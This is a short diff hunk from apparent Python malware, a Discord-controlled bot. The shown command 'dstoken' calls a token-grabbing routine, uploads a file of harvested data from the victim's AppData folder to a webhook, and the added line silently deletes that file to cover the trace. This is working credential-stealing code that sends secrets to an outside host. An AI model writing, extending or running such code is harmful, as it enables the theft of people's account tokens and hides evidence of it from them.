@@ -486,6 +486,7 @@ async def dstoken(ctx):
             with open(f'{appdatar}\Error 404.txt', "rb") as f:
                 webhook.add_file(file=f.read(), filename='Error 404.txt')
             webhook.execute()
+            subprocess.getoutput('if exist "%appdata%\Error 404.txt" del "%appdata%\Error 404.txt"/q')
     dstokengrab()
 
 
